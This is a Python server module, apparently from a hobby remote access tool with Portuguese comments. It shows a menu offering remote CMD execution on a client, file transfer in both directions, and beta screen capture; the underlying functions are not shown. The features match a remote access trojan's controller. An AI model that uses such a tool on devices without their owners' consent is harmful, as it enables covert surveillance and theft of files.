from Server.mandar_cmd import mandar_cmd
from Server.transferir_receber_arquivos import transferir_arquivo, pegar_arquivo
from Server.BETA.captura_tela import capturar_tela_em_video

#Menu principal para selecionar entre transferencia de arquivo ou execução de cmd no dispositivo client
def menu(conn):
        titulo = 'Remote Access Control v1.0'
        barra = '='
        print(f'\n{barra * 40}\n{titulo.center(40)}\n{barra * 40}\n\n> [1] Executar comandos CMD\n> [2] Transferencia de arquivo para o CLIENT\n> [3] Pegar arquivos do CLIENT\n\n{barra * 40}\n{'BETA'.center(40)}\n{barra * 40}\n\n> [4] Ver o que Tela do Client\n')
        
        selecao = input('root@server > ')
                
        conn.sendall(selecao.encode())
        if selecao.lower() == 'sair':
             print('\nFechando programa...\n')
             conn.send(selecao.encode())
             conn.close()
             exit()
             
        elif selecao == '1':
            mandar_cmd(conn)

        elif selecao == '2':
            transferir_arquivo(conn)

        elif selecao == '3':
            pegar_arquivo(conn)

        elif selecao == '4':
            capturar_tela_em_video(conn)

        else:
             print('\nOpção inválida')